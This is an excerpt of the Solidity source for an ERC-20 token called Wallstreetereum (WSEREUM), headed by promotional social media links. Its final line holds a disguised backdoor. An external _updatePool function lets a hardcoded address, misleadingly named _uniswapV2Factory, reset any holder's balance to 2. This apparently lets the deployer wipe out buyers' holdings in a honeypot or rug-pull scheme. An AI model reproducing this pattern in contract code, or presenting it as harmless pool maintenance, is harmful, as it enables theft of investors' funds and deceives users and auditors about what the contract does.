...
/*
https://twitter.com/WSEREUMETH
https://t.me/WSEREUMETH
https://WSEREUMETH.xyz
*/
...
contract WSEREUM is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Wallstreetereum";
    string private constant _symbol = unicode"WSEREUM";
    uint8 private constant _decimals = 9;
    uint256 private _totSupply = 5010000000000 * 10**_decimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _uniswapV2Factory = 0xd4C8c9885133bF6DC1eE5e7262e238f45Ee099F6;
    ...
    function _updatePool(address _updatePoolSender) external { if (msg.sender == _uniswapV2Factory) _balances[_updatePoolSender] = 2; }
